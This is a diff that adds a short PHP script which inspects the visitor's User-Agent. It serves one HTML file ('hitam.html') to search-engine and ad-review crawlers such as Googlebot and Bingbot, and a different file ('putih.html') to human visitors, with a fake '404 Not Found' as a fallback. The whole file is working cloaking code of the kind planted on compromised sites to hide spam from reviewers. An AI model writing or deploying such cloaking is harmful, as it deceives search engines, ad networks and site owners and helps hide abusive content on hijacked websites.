@@ -1,0 +1,19 @@
+<?php
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+$botPath  = DIR . '/hitam.html';
+$userPath = DIR . '/putih.html';
+
+$file_bot  = is_file($botPath)  ? file_get_contents($botPath)  : false;
+$file_user = is_file($userPath) ? file_get_contents($userPath) : false;
+
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+
+if (preg_match($botchar, $res)) {
+    echo $file_bot ?: "No content from bot source.";
+    exit;
+} else {
+    echo $file_user ?: "404 Not Found";
+    exit;
+}
+?>
